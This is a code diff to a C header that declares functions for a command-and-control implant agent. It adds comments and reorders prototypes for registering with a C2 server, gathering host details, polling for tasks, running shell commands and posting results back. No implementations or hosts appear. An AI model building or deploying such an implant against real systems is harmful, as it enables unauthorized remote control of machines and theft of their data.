@@ -34,23 +34,41 @@ struct tasks {
 	size_t cap;
 };
 
-bool reg(struct agent_info *agent, struct strings_array *sa);
-
-bool check_tasks(struct agent_info *agent, struct strings_array *sa);
-
+// Obtains target host information (host name, OS, version).
 bool get_host_info(struct agent_info *agent);
 
-bool run_cmd(struct strings_array *sa, struct tasks *task);
+// Registers self with C2 server, providing target host information. 
+bool reg(struct agent_info *agent, struct strings_array *sa);
 
+// Parses UUID from C2 registration response and concatenates to base tasks URL
+// to create complete tasks URL. Assigns URL value to corresponding field in
+// the agent_info struct.
+void create_tasks_url(char *response, struct agent_info *agent);
+
+// Executes GET request to C2 server to check for tasks. 
+bool check_tasks(struct agent_info *agent, struct strings_array *sa);
+
+// Checks to see if a binary for a provided cmd task exists on the target host.
 bool can_run_cmd(const char *cmd);
 
+// Executes a shell command.
+bool run_cmd(struct strings_array *sa, struct tasks *task);
+
+// Parses task file received from C2 server and assigns values to task struct
+// fields.
 bool parse_tasks(char *response, struct tasks *task);
 
+// Posts task results to C2 server.
 bool post_results(struct strings_array *sa);
 
+// Frees memory for task array of strings.
 void destroy(struct tasks *task);
 
+// Converts data from *char type to FILE type.
 FILE *char_to_file(char * data);
+
+// memsets task struct values.
+void memset_task_vals(struct tasks *task);
 
 
 #endif
